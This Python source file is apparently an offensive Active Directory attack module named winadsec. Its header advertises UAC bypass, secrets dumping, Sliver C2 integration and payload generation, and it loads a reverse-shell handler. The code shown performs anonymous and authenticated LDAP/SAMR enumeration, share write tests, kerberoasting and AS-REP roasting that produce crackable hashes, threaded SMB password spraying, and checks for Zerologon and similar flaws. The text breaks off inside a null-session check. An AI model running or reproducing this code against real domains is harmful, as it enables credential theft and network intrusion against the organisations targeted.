#!/usr/bin/env python3
"""
winadsec — Windows Active Directory pentest + post-exploitation module for SecV
Author: 0xb0rn3 | 0xbv1 | github.com/0xb0rn3

Full attack chain:
  discover → enum → kerberoast/AS-REP → spray → vulncheck → exec →
  privesc_check → uac_bypass → lsa_fix → secrets → loot
  + Sliver C2 bridge + payload/delivery generation
"""

import json
import sys
import os
import re
import socket
import shutil
import struct
import time
import base64
import subprocess
import tempfile
import threading
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from typing import Any, Dict, List, Optional, Tuple
import importlib.util as _ilu

# ── OnlyShell reverse shell handler ──────────────────────────────────────────
def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "0.0.0.0"

_RS_MOD = None
def _rs():
    global _RS_MOD
    if _RS_MOD is not None:
        return _RS_MOD
    for _c in [
        Path(__file__).parent.parent.parent / "network" / "revshell" / "revshell.py",
        Path(__file__).parent / "revshell" / "revshell.py",
    ]:
        if _c.exists():
            _s = _ilu.spec_from_file_location("revshell", _c)
            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
            _RS_MOD = _m; return _m
    return None

# ============================================================================
# CAPABILITY DETECTION
# ============================================================================

CAPS: Dict[str, Any] = {
    'nmap':              bool(shutil.which('nmap')),
    'smbclient':         bool(shutil.which('smbclient')),
    'rpcclient':         bool(shutil.which('rpcclient')),
    'ldapsearch':        bool(shutil.which('ldapsearch')),
    'nxc':               bool(shutil.which('nxc') or shutil.which('netexec')),
    'kerbrute':          bool(shutil.which('kerbrute')),
    'smbmap':            bool(shutil.which('smbmap')),
    'bloodhound_python': bool(shutil.which('bloodhound-python')),
    'secretsdump':       bool(shutil.which('secretsdump.py') or shutil.which('impacket-secretsdump')),
    'xorriso':           bool(shutil.which('xorriso')),
    'root':              os.geteuid() == 0,
}

# Zig cross-compiler
_zig_paths = ['/tmp/zig-linux-x86_64-0.14.0/zig', os.path.expanduser('~/zig/zig'), shutil.which('zig') or '']
CAPS['zig'] = next((p for p in _zig_paths if p and os.path.isfile(p)), None)

# Donut PE→shellcode
_donut_paths = ['/tmp/donut-1.0/donut', os.path.expanduser('~/donut/donut'), shutil.which('donut') or '']
CAPS['donut'] = next((p for p in _donut_paths if p and os.path.isfile(p)), None)

# Sliver client binary
_sliver_paths = [
    os.path.expanduser('~/sliver/sliver-client'),
    shutil.which('sliver-client') or '',
]
CAPS['sliver_client'] = next((p for p in _sliver_paths if p and os.path.isfile(p)), None)

# Sliver operator config
_cfg_paths = [
    os.path.expanduser('~/.sliver-client/configs/oxbv1_127.0.0.1.cfg'),
    '/tmp/oxbv1.cfg',
]
CAPS['sliver_config'] = next((p for p in _cfg_paths if p and os.path.isfile(p)), None)

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
    from ldap3.core.exceptions import LDAPBindError
    CAPS['ldap3'] = True
except ImportError:
    CAPS['ldap3'] = False

try:
    import dns.resolver
    CAPS['dnspython'] = True
except ImportError:
    CAPS['dnspython'] = False

try:
    import impacket
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.dcerpc.v5 import transport, samr
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
    CAPS['impacket'] = True
except ImportError:
    CAPS['impacket'] = False

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    CAPS['requests'] = True
except ImportError:
    CAPS['requests'] = False


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class DomainInfo:
    domain: str = ""
    netbios: str = ""
    domain_sid: str = ""
    forest: str = ""
    dc_hostname: str = ""
    dc_ip: str = ""
    os: str = ""
    smb_signing: str = ""
    smb_dialect: str = ""
    ldap_anonymous: bool = False
    smb_anonymous: bool = False
    null_session: bool = False
    functional_level: str = ""
    naming_contexts: List[str] = field(default_factory=list)
    has_smbv1: bool = False
    is_dc: bool = False

@dataclass
class ADUser:
    sid: str = ""
    rid: int = 0
    username: str = ""
    full_name: str = ""
    description: str = ""
    last_logon: str = ""
    pwd_last_set: str = ""
    kerberos_preauth: bool = True
    spn: List[str] = field(default_factory=list)
    admin_count: bool = False
    enabled: bool = True
    locked: bool = False
    member_of: List[str] = field(default_factory=list)
    user_account_control: int = 0

@dataclass
class ADGroup:
    sid: str = ""
    name: str = ""
    description: str = ""
    members: List[str] = field(default_factory=list)
    type: str = ""

@dataclass
class SMBShare:
    name: str = ""
    type: str = ""
    comment: str = ""
    readable: bool = False
    writable: bool = False
    root_listing: List[str] = field(default_factory=list)

@dataclass
class Vulnerability:
    cve: str = ""
    name: str = ""
    vulnerable: bool = False
    evidence: str = ""
    severity: str = "INFO"

@dataclass
class SprayResult:
    username: str = ""
    password: str = ""
    success: bool = False
    error: str = ""

@dataclass
class LootItem:
    share: str = ""
    path: str = ""
    type: str = ""
    size: int = 0
    content_preview: str = ""
    severity: str = "INFO"


# ============================================================================
# UTILITIES
# ============================================================================

def log(msg: str) -> None:
    print(f"[winadsec] {msg}", file=sys.stderr, flush=True)

def parse_hash(h: str) -> Tuple[str, str]:
    if not h:
        return "", ""
    if ":" in h:
        parts = h.split(":")
        return parts[0], parts[1]
    return "aad3b435b51404eeaad3b435b51404ee", h

def run_cmd(cmd: List[str], timeout: int = 30, input_data: Optional[str] = None) -> Tuple[int, str, str]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout, input=input_data, errors='replace')
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return 124, "", f"timeout after {timeout}s"
    except FileNotFoundError:
        return 127, "", f"{cmd[0]} not found"
    except Exception as e:
        return 1, "", str(e)

def tcp_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def resolve(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return ""

def reverse_resolve(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return ""

def safe_filename(s: str) -> str:
    return re.sub(r'[^A-Za-z0-9._-]', '_', s)

def ts() -> str:
    return datetime.now().strftime("%Y%m%d-%H%M%S")


# ============================================================================
# DISCOVERY
# ============================================================================

class ADDiscovery:
    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.info = DomainInfo()
        self.info.dc_ip = resolve(target) or target

    def run(self) -> DomainInfo:
        log(f"discover → {self.target}")
        self._port_probe()
        self._nmap_dc()
        self._smb_probe()
        self._ldap_probe()
        self._netbios_probe()
        return self.info

    def _port_probe(self) -> None:
        ports = {53: 'dns', 88: 'kerberos', 135: 'rpc', 139: 'netbios-ssn',
                 389: 'ldap', 445: 'smb', 464: 'kpasswd', 636: 'ldaps',
                 593: 'rpc-https', 3268: 'gc', 3269: 'gc-ssl'}
        open_ports = [p for p in ports if tcp_open(self.target, p, 1.5)]
        if 88 in open_ports and 389 in open_ports and 445 in open_ports:
            self.info.is_dc = True

    def _nmap_dc(self) -> None:
        if not CAPS['nmap']:
            return
        rc, out, _ = run_cmd([
            'nmap', '-Pn', '-T4', '-p', '88,135,139,389,445,636,3268',
            '--script', 'smb-os-discovery,ldap-rootdse,smb2-security-mode',
            '-oX', '-', self.target
        ], timeout=self.timeout * 6)
        if rc != 0:
            return
        for pat, attr in [
            (r'OS:\s*(.+?)(?:\n|\\|$)', 'os'),
            (r'NetBIOS computer name:\s*(.+?)(?:\\x00|\n|$)', 'dc_hostname'),
            (r'Domain name:\s*(.+?)(?:\\x00|\n|$)', 'domain'),
            (r'Forest name:\s*(.+?)(?:\\x00|\n|$)', 'forest'),
            (r'NetBIOS domain name:\s*(.+?)(?:\\x00|\n|$)', 'netbios'),
        ]:
            m = re.search(pat, out)
            if m and not getattr(self.info, attr):
                setattr(self.info, attr, m.group(1).strip())
        if 'message_signing: required' in out:
            self.info.smb_signing = 'required'
        elif 'message_signing: disabled' in out:
            self.info.smb_signing = 'disabled'
        elif 'message_signing: supported' in out:
            self.info.smb_signing = 'supported'
        for nc in re.findall(r'namingContexts:\s*(\S+)', out):
            self.info.naming_contexts.append(nc)

    def _smb_probe(self) -> None:
        if not CAPS['impacket']:
            return
        try:
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
            try:
                smb.login('', '')
                self.info.smb_anonymous = True
                self.info.null_session = True
                self.info.dc_hostname = smb.getServerName() or self.info.dc_hostname
                self.info.netbios = smb.getServerDomain() or self.info.netbios
                if not self.info.os:
                    self.info.os = str(smb.getServerOS())
                if not self.info.smb_signing:
                    self.info.smb_signing = 'required' if smb.isSigningRequired() else 'optional'
                smb.logoff()
            except SessionError:
                pass
        except Exception as e:
            log(f"smb probe: {e}")

    def _ldap_probe(self) -> None:
        if not CAPS['ldap3']:
            return
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            self.info.ldap_anonymous = True
            if server.info:
                if not self.info.naming_contexts and server.info.naming_contexts:
                    self.info.naming_contexts = list(server.info.naming_contexts)
                attrs = server.info.other or {}
                fl = (attrs.get('domainFunctionality') or [''])[0]
                if fl:
                    fl_map = {'0':'2000','2':'2003','3':'2008','4':'2008R2',
                              '5':'2012','6':'2012R2','7':'2016','8':'2025'}
                    self.info.functional_level = fl_map.get(str(fl), str(fl))
                if not self.info.dc_hostname:
                    self.info.dc_hostname = (attrs.get('dnsHostName') or [''])[0]
                if not self.info.domain:
                    for nc in self.info.naming_contexts:
                        if nc.upper().startswith('DC='):
                            self.info.domain = '.'.join(p[3:] for p in nc.split(','))
                            break
            conn.unbind()
        except LDAPBindError:
            self.info.ldap_anonymous = False
        except Exception as e:
            log(f"ldap probe: {e}")

    def _netbios_probe(self) -> None:
        if self.info.dc_hostname and self.info.netbios:
            return
        if shutil.which('nmblookup'):
            rc, out, _ = run_cmd(['nmblookup', '-A', self.target], timeout=5)
            if rc == 0:
                m = re.search(r'(\S+)\s+<00>\s+-\s+M\s', out)
                if m and not self.info.dc_hostname:
                    self.info.dc_hostname = m.group(1).strip()


# ============================================================================
# AUTH
# ============================================================================

class ADAuth:
    def __init__(self, params: Dict[str, Any]):
        self.domain   = (params.get('domain') or "").strip()
        self.username = (params.get('username') or "").strip()
        self.password = params.get('password') or ""
        self.hash     = (params.get('hash') or "").strip()
        self.kerberos = bool(params.get('kerberos'))
        self.dc_ip    = (params.get('dc_ip') or "").strip()
        self.lm, self.nt = parse_hash(self.hash)

    @property
    def has_creds(self) -> bool:
        return bool(self.username) and (bool(self.password) or bool(self.hash))

    def smb_login(self, conn: 'SMBConnection') -> None:
        if self.hash:
            conn.login(self.username, '', self.domain, self.lm, self.nt)
        else:
            conn.login(self.username, self.password, self.domain)

    def ldap_user(self) -> str:
        if not self.username:
            return ""
        if '\\' in self.username or '@' in self.username:
            return self.username
        return f"{self.domain}\\{self.username}" if self.domain else self.username


# ============================================================================
# ENUMERATION
# ============================================================================

class ADEnumerator:
    def __init__(self, target: str, auth: ADAuth, timeout: int = 30):
        self.target  = target
        self.auth    = auth
        self.timeout = timeout

    def users_via_ldap(self) -> List[ADUser]:
        if not CAPS['ldap3']:
            return []
        users: List[ADUser] = []
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            auth_type = NTLM if (self.auth.has_creds and not self.auth.kerberos) else None
            passwd = self.auth.password or (f"{self.auth.lm}:{self.auth.nt}" if self.auth.hash else "")
            if auth_type:
                conn = Connection(server, user=self.auth.ldap_user(), password=passwd,
                                  authentication=auth_type, auto_bind=True,
                                  receive_timeout=self.timeout)
            else:
                conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts or [])
                         if nc.upper().startswith("DC=")), "")
            if not base:
                conn.unbind(); return []
            attrs = ['sAMAccountName','objectSid','displayName','description',
                     'userAccountControl','lastLogon','pwdLastSet',
                     'servicePrincipalName','adminCount','memberOf']
            conn.search(base, '(&(objectClass=user)(objectCategory=person))',
                        search_scope=SUBTREE, attributes=attrs, paged_size=500)
            for entry in conn.entries:
                u = ADUser()
                u.username  = str(entry.sAMAccountName) if 'sAMAccountName' in entry else ''
                u.full_name = str(entry.displayName) if 'displayName' in entry else ''
                u.description = str(entry.description) if 'description' in entry else ''
                if 'objectSid' in entry:
                    u.sid = str(entry.objectSid.value or '')
                    if u.sid:
                        try: u.rid = int(u.sid.split('-')[-1])
                        except ValueError: pass
                if 'userAccountControl' in entry:
                    try:
                        uac = int(entry.userAccountControl.value)
                        u.user_account_control = uac
                        u.enabled  = not bool(uac & 0x2)
                        u.locked   = bool(uac & 0x10)
                        u.kerberos_preauth = not bool(uac & 0x400000)
                    except (ValueError, TypeError): pass
                if 'servicePrincipalName' in entry:
                    spns = entry.servicePrincipalName.value
                    u.spn = list(spns) if isinstance(spns, list) else ([spns] if spns else [])
                if 'adminCount' in entry:
                    try: u.admin_count = int(entry.adminCount.value or 0) > 0
                    except (ValueError, TypeError): pass
                if 'memberOf' in entry:
                    mo = entry.memberOf.value
                    u.member_of = list(mo) if isinstance(mo, list) else ([mo] if mo else [])
                if u.username:
                    users.append(u)
            conn.unbind()
        except Exception as e:
            log(f"ldap users: {e}")
        return users

    def users_via_samr(self, rid_max: int = 4000) -> List[ADUser]:
        if not CAPS['impacket']:
            return []
        users: List[ADUser] = []
        try:
            rpctransport = transport.SMBTransport(
                self.target, 445, r'\samr',
                self.auth.username, self.auth.password,
                self.auth.domain, self.auth.lm, self.auth.nt)
            dce = rpctransport.get_dce_rpc()
            dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
            resp = samr.hSamrConnect(dce)
            sh = resp['ServerHandle']
            resp = samr.hSamrEnumerateDomainsInSamServer(dce, sh)
            dn = resp['Buffer']['Buffer'][0]['Name']
            resp = samr.hSamrLookupDomainInSamServer(dce, sh, dn)
            dsid = resp['DomainId'].formatCanonical()
            resp = samr.hSamrOpenDomain(dce, sh, domainId=resp['DomainId'])
            dh = resp['DomainHandle']
            try:
                enum_ctx = 0
                while True:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, dh, enumerationContext=enum_ctx)
                    for e in resp['Buffer']['Buffer']:
                        u = ADUser(username=str(e['Name']), rid=int(e['RelativeId']))
                        u.sid = f"{dsid}-{u.rid}"
                        users.append(u)
                    if resp['ErrorCode'] != 0x105: break
                    enum_ctx = resp['EnumerationContext']
            except Exception:
                for batch_start in range(0, rid_max, 500):
                    batch = list(range(batch_start + 500, min(batch_start + 1000, rid_max + 1)))
                    try:
                        resp = samr.hSamrLookupIdsInDomain(dce, dh, batch)
                        for i, name in enumerate(resp['Names']['Element']):
                            if name['Length'] > 0:
                                u = ADUser(username=str(name), rid=batch[i])
                                u.sid = f"{dsid}-{u.rid}"
                                users.append(u)
                    except Exception: continue
            dce.disconnect()
        except Exception as e:
            log(f"samr: {e}")
        return users

    def groups_via_ldap(self) -> List[ADGroup]:
        if not CAPS['ldap3']:
            return []
        groups: List[ADGroup] = []
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            auth_type = NTLM if (self.auth.has_creds and not self.auth.kerberos) else None
            passwd = self.auth.password or (f"{self.auth.lm}:{self.auth.nt}" if self.auth.hash else "")
            if auth_type:
                conn = Connection(server, user=self.auth.ldap_user(), password=passwd,
                                  authentication=auth_type, auto_bind=True,
                                  receive_timeout=self.timeout)
            else:
                conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts or [])
                         if nc.upper().startswith("DC=")), "")
            if not base:
                conn.unbind(); return []
            conn.search(base, '(objectClass=group)', search_scope=SUBTREE,
                        attributes=['sAMAccountName','objectSid','description','member','groupType'],
                        paged_size=500)
            for entry in conn.entries:
                g = ADGroup(name=str(entry.sAMAccountName) if 'sAMAccountName' in entry else '')
                g.description = str(entry.description) if 'description' in entry else ''
                if 'objectSid' in entry:
                    g.sid = str(entry.objectSid.value or '')
                if 'member' in entry:
                    mo = entry.member.value
                    g.members = list(mo) if isinstance(mo, list) else ([mo] if mo else [])
                if 'groupType' in entry:
                    try:
                        gt = int(entry.groupType.value)
                        g.type = 'Security' if gt & 0x80000000 else 'Distribution'
                    except (ValueError, TypeError): pass
                if g.name:
                    groups.append(g)
            conn.unbind()
        except Exception as e:
            log(f"ldap groups: {e}")
        return groups

    def shares(self) -> List[SMBShare]:
        if not CAPS['impacket']:
            return self._shares_smbclient()
        out: List[SMBShare] = []
        try:
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
            self.auth.smb_login(smb)
            for s in smb.listShares():
                share = SMBShare(
                    name=s['shi1_netname'][:-1],
                    comment=s['shi1_remark'][:-1] if s['shi1_remark'] else '')
                stype = s['shi1_type']
                share.type = {0: 'DISK', 1: 'PRINTER', 3: 'IPC'}.get(stype & 0x7FFFFFFF, f"TYPE-{stype}")
                try:
                    files = list(smb.listPath(share.name, '*'))
                    share.readable = True
                    share.root_listing = [f.get_longname() for f in files
                                          if f.get_longname() not in ('.', '..')][:30]
                except Exception:
                    share.readable = False
                if share.readable and share.type == 'DISK' and share.name != 'IPC$':
                    try:
                        test = f"wa_{ts()}.tmp"
                        fid = smb.createFile(share.name, test)
                        smb.closeFile(share.name, fid)
                        smb.deleteFile(share.name, test)
                        share.writable = True
                    except Exception:
                        share.writable = False
                out.append(share)
            smb.logoff()
        except Exception as e:
            log(f"shares: {e}")
        return out

    def _shares_smbclient(self) -> List[SMBShare]:
        if not CAPS['smbclient']:
            return []
        cmd = (['smbclient', '-L', f'//{self.target}', '-N'] if not self.auth.has_creds else
               ['smbclient', '-L', f'//{self.target}',
                '-U', f'{self.auth.domain}/{self.auth.username}%{self.auth.password}'])
        rc, out, _ = run_cmd(cmd, timeout=self.timeout)
        shares = []
        for line in out.splitlines():
            m = re.match(r'\s+(\S+)\s+(Disk|IPC|Printer)\s*(.*)', line)
            if m:
                shares.append(SMBShare(name=m.group(1), type=m.group(2).upper(),
                                       comment=m.group(3).strip()))
        return shares

    def passpol(self) -> Dict[str, Any]:
        pol: Dict[str, Any] = {}
        if not CAPS['impacket']:
            return self._passpol_rpcclient()
        try:
            rpctransport = transport.SMBTransport(
                self.target, 445, r'\samr',
                self.auth.username, self.auth.password,
                self.auth.domain, self.auth.lm, self.auth.nt)
            dce = rpctransport.get_dce_rpc()
            dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
            resp = samr.hSamrConnect(dce)
            sh = resp['ServerHandle']
            resp = samr.hSamrEnumerateDomainsInSamServer(dce, sh)
            dn = resp['Buffer']['Buffer'][0]['Name']
            resp = samr.hSamrLookupDomainInSamServer(dce, sh, dn)
            resp = samr.hSamrOpenDomain(dce, sh, domainId=resp['DomainId'])
            dh = resp['DomainHandle']
            try:
                resp = samr.hSamrQueryInformationDomain2(
                    dce, dh,
                    domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
                pol['min_length']  = int(resp['Buffer']['Password']['MinPasswordLength'])
                pol['history']     = int(resp['Buffer']['Password']['PasswordHistoryLength'])
                pol['complexity']  = bool(resp['Buffer']['Password']['PasswordProperties'] & 0x1)
            except Exception: pass
            try:
                resp = samr.hSamrQueryInformationDomain2(
                    dce, dh,
                    domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
                pol['lockout_threshold']    = int(resp['Buffer']['Lockout']['LockoutThreshold'])
                lockout_dur = int(resp['Buffer']['Lockout']['LockoutDuration'])
                pol['lockout_duration_min'] = abs(lockout_dur) / 10000000 / 60 if lockout_dur else 0
                obs = int(resp['Buffer']['Lockout']['LockoutObservationWindow'])
                pol['observation_window_min'] = abs(obs) / 10000000 / 60 if obs else 0
            except Exception: pass
            dce.disconnect()
        except Exception as e:
            log(f"passpol: {e}")
        return pol

    def _passpol_rpcclient(self) -> Dict[str, Any]:
        if not CAPS['rpcclient']:
            return {}
        rc, out, _ = run_cmd(['rpcclient', '-U', '%', self.target, '-c',
                               'getdompwinfo'], timeout=self.timeout)
        pol: Dict[str, Any] = {}
        m = re.search(r'min_password_length:\s*(\d+)', out)
        if m: pol['min_length'] = int(m.group(1))
        return pol


# ============================================================================
# KERBEROS ATTACKS
# ============================================================================

class KerberosAttacker:
    def __init__(self, target: str, auth: ADAuth, timeout: int = 30):
        self.target  = target
        self.auth    = auth
        self.timeout = timeout

    def kerberoast(self) -> List[Dict[str, str]]:
        if not (CAPS['impacket'] and CAPS['ldap3']) or not self.auth.has_creds:
            return []
        results: List[Dict[str, str]] = []
        spn_users = []
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            conn = Connection(server, user=self.auth.ldap_user(),
                              password=self.auth.password or f"{self.auth.lm}:{self.auth.nt}",
                              authentication=NTLM, auto_bind=True,
                              receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts if server.info else [])
                         if nc.upper().startswith("DC=")), "")
            if not base:
                conn.unbind(); return []
            conn.search(base,
                        '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt)))',
                        search_scope=SUBTREE, attributes=['sAMAccountName','servicePrincipalName'])
            for entry in conn.entries:
                username = str(entry.sAMAccountName)
                spns = entry.servicePrincipalName.value
                spns = list(spns) if isinstance(spns, list) else ([spns] if spns else [])
                for spn in spns:
                    spn_users.append((username, spn))
            conn.unbind()
        except Exception as e:
            log(f"kerberoast ldap: {e}"); return []
        if not spn_users:
            return []
        try:
            from impacket.krb5.types import KerberosTime
            from pyasn1.codec.der import decoder as asn_dec
            user_principal = Principal(self.auth.username,
                                       type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, _, sessionKey = getKerberosTGT(
                user_principal, self.auth.password, self.auth.domain.upper(),
                self.auth.lm.encode() if self.auth.hash else b'',
                self.auth.nt.encode() if self.auth.hash else b'',
                aesKey='', kdcHost=self.auth.dc_ip or self.target)
            for username, spn in spn_users:
                try:
                    srvp = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, _, _, _ = getKerberosTGS(
                        srvp, self.auth.domain.upper(),
                        self.auth.dc_ip or self.target, tgt, cipher, sessionKey)
                    from impacket.krb5.asn1 import TGS_REP
                    dec = asn_dec.decode(tgs, asn1Spec=TGS_REP())[0]
                    enc_part = bytes(dec['ticket']['enc-part']['cipher'])
                    etype = int(dec['ticket']['enc-part']['etype'])
                    h = (f"$krb5tgs$23$*{username}${self.auth.domain.upper()}${spn}*$"
                         f"{enc_part[:16].hex()}${enc_part[16:].hex()}"
                         if etype == 23 else
                         f"$krb5tgs${etype}${username}${self.auth.domain.upper()}${spn}${enc_part.hex()}")
                    results.append({'username': username, 'spn': spn, 'hash': h, 'etype': str(etype)})
                except Exception as e:
                    log(f"TGS {username}: {e}")
        except Exception as e:
            log(f"kerberoast TGT: {e}")
        return results

    def asreproast(self, userlist: List[str]) -> List[Dict[str, str]]:
        if not CAPS['impacket'] or not self.auth.domain:
            return []
        from impacket.krb5.kerberosv5 import KerberosError, sendReceive
        from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP
        from impacket.krb5 import constants as kc
        from impacket.krb5.types import KerberosTime
        from pyasn1.codec.der import encoder, decoder as dec
        from pyasn1.type.univ import noValue
        results: List[Dict[str, str]] = []
        kdc = self.auth.dc_ip or self.target
        for username in userlist:
            username = username.strip()
            if not username:
                continue
            try:
                client = Principal(username, type=kc.PrincipalNameType.NT_PRINCIPAL.value)
                req = AS_REQ(); req['pvno'] = 5
                req['msg-type'] = int(kc.ApplicationTagNumbers.AS_REQ.value)
                req['padata'] = noValue; req['padata'][0] = noValue
                req['padata'][0]['padata-type'] = int(kc.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
                pac = KERB_PA_PAC_REQUEST(); pac['include-pac'] = True
                req['padata'][0]['padata-value'] = encoder.encode(pac)
                body = noValue
                opts = [int(kc.KDCOptions.forwardable.value),
                        int(kc.KDCOptions.renewable.value),
                        int(kc.KDCOptions.proxiable.value)]
                body['kdc-options'] = kc.encodeFlags(opts)
                domain_upper = self.auth.domain.upper()
                seq_set(body, 'sname', Principal(f'krbtgt/{domain_upper}',
                                                 type=kc.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
                seq_set(body, 'cname', client.components_to_asn1)
                body['realm'] = domain_upper
                now = datetime.utcnow()
                body['till'] = KerberosTime.to_asn1(now)
                body['rtime'] = KerberosTime.to_asn1(now)
                body['nonce'] = 0
                seq_set_iter(body, 'etype', (
                    int(kc.EncryptionTypes.rc4_hmac.value),
                    int(kc.EncryptionTypes.aes256_cts_hmac_sha1_96.value)))
                req['req-body'] = body
                r = sendReceive(encoder.encode(req), domain_upper, kdc)
                as_rep = dec.decode(r, asn1Spec=AS_REP())[0]
                etype = int(as_rep['enc-part']['etype'])
                cipher = bytes(as_rep['enc-part']['cipher'])
                h = (f"$krb5asrep$23${username}@{domain_upper}:{cipher[:16].hex()}${cipher[16:].hex()}"
                     if etype == 23 else
                     f"$krb5asrep${etype}${username}@{domain_upper}:{cipher.hex()}")
                results.append({'username': username, 'hash': h, 'etype': str(etype)})
            except KerberosError as e:
                if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' not in str(e):
                    pass
            except Exception:
                pass
        return results


# ============================================================================
# PASSWORD SPRAYER
# ============================================================================

class PasswordSprayer:
    def __init__(self, target: str, auth: ADAuth, timeout: int = 5):
        self.target  = target
        self.auth    = auth
        self.timeout = timeout

    def spray_smb(self, users: List[str], passwords: List[str],
                  lockout_threshold: int = 0, threads: int = 10,
                  exclude: List[str] = None) -> List[SprayResult]:
        if not CAPS['impacket']:
            return []
        exclude = set(s.lower() for s in (exclude or []))
        for trap in ('krbtgt', 'administrator', 'guest'):
            exclude.add(trap)
        results: List[SprayResult] = []
        max_per_round = max(1, lockout_threshold - 2) if lockout_threshold > 0 else len(passwords)
        if lockout_threshold > 0 and len(passwords) > max_per_round:
            log(f"lockout={lockout_threshold} → capping at {max_per_round} passwords")
            passwords = passwords[:max_per_round]

        def attempt(u: str, p: str) -> SprayResult:
            r = SprayResult(username=u, password=p)
            try:
                smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
                smb.login(u, p, self.auth.domain)
                r.success = True; smb.logoff()
            except SessionError as e:
                msg = str(e)
                if 'STATUS_LOGON_FAILURE' in msg:       r.error = 'wrong-password'
                elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg: r.error = 'LOCKED'
                elif 'STATUS_ACCOUNT_DISABLED' in msg:   r.error = 'disabled'
                elif 'STATUS_PASSWORD_MUST_CHANGE' in msg: r.error = 'must-change'; r.success = True
                elif 'STATUS_PASSWORD_EXPIRED' in msg:   r.error = 'expired';  r.success = True
                else: r.error = msg.split(':')[-1].strip()[:60]
            except Exception as e:
                r.error = str(e)[:60]
            return r

        stop = threading.Event()
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = []
            for p in passwords:
                for u in users:
                    if u.lower() in exclude or stop.is_set():
                        continue
                    futures.append(ex.submit(attempt, u, p))
            for f in as_completed(futures):
                r = f.result()
                if r.error == 'LOCKED':
                    log(f"LOCKED {r.username} — halting spray")
                    stop.set()
                if r.success or r.error in ('LOCKED', 'must-change', 'expired'):
                    results.append(r)
                    if r.success:
                        log(f"HIT {r.username}:{r.password}")
        return results


# ============================================================================
# VULN CHECKS
# ============================================================================

class VulnChecker:
    def __init__(self, target: str, info: DomainInfo, timeout: int = 10):
        self.target  = target
        self.info    = info
        self.timeout = timeout

    def run(self) -> List[Vulnerability]:
        checks = [self._zerologon, self._petitpotam, self._smbv1, self._smb_signing,
                  self._null_session, self._anonymous_ldap,
                  self._machine_account_quota, self._adcs_detection, self._nopac_check]
        return [v for c in checks for v in [c()] if v]

    def _zerologon(self) -> Optional[Vulnerability]:
        v = Vulnerability(cve='CVE-2020-1472', name='Zerologon', severity='CRITICAL')
        if CAPS['nmap']:
            rc, out, _ = run_cmd(['nmap', '-Pn', '-p', '445',
                                  '--script', 'smb-vuln-cve2020-1472',
                                  self.target], timeout=self.timeout * 4)
            v.vulnerable = 'VULNERABLE' in out.upper()
            v.evidence = 'nmap reports VULNERABLE' if v.vulnerable else 'patched per nmap'
        else:
            v.evidence = 'nmap unavailable'
        return v

    def _petitpotam(self) -> Vulnerability:
        v = Vulnerability(cve='CVE-2021-36942', name='PetitPotam', severity='HIGH')
        v.vulnerable = tcp_open(self.target, 445, 2.0) and self.info.is_dc
        v.evidence = 'MS-EFSRPC reachable on DC' if v.vulnerable else 'not applicable'
        return v

    def _smbv1(self) -> Vulnerability:
        v = Vulnerability(name='SMBv1 enabled', severity='HIGH')
        if CAPS['nmap']:
            rc, out, _ = run_cmd(['nmap','-Pn','-p','445','--script','smb-protocols',
                                   self.target], timeout=self.timeout*2)
            if re.search(r'\b(NT LM 0\.12|SMBv1|SMB 1)\b', out):
                v.vulnerable = True; v.evidence = 'SMBv1 dialect advertised'
        return v

    def _smb_signing(self) -> Vulnerability:
        v = Vulnerability(name='SMB signing not required', severity='MEDIUM')
        if self.info.smb_signing in ('disabled','optional','supported'):
            v.vulnerable = True
            v.evidence = f"signing={self.info.smb_signing} → relay attacks possible"
        return v

    def _null_session(self) -> Vulnerability:
